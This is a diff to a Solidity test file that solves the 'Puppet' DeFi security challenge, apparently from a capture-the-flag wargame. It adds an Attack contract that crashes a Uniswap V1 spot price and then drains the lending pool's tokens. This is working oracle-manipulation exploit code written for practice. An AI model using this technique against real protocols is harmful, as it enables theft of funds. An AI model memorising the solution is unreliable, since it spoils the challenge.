@@ -91,8 +91,15 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {
-        
+    function test_puppett() public checkSolvedByPlayer {
+        // Attack
+        Attack attack = new Attack(uniswapV1Exchange, lendingPool, recovery);
+        payable(address(attack)).call{value: 25 ether}("");
+        token.transfer(address(attack), 1000e18);
+        vm.startPrank(address(attack));
+        token.approve(address(uniswapV1Exchange), type(uint256).max);
+        vm.stopPrank();
+        attack.attack();        
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +122,23 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+contract Attack {
+    IUniswapV1Exchange uniswapV1Exchange;
+    PuppetPool lendingPool;
+    address recovery;
+
+    constructor(IUniswapV1Exchange _uniswapV1Exchange, PuppetPool _lendingPool, address _recovery) {
+        uniswapV1Exchange = _uniswapV1Exchange;
+        lendingPool = _lendingPool;
+        recovery = _recovery;
+        
+    }
+    function attack() public {
+        // manipulate the DEX price first, then borrow from lending pool
+        uniswapV1Exchange.tokenToEthSwapInput(1000e18, 5e18, block.timestamp + 1);
+        // drain the lending pool   
+        lendingPool.borrow{value: 25 ether}(100000e18, recovery);
+    }
+    receive() external payable {}
 }
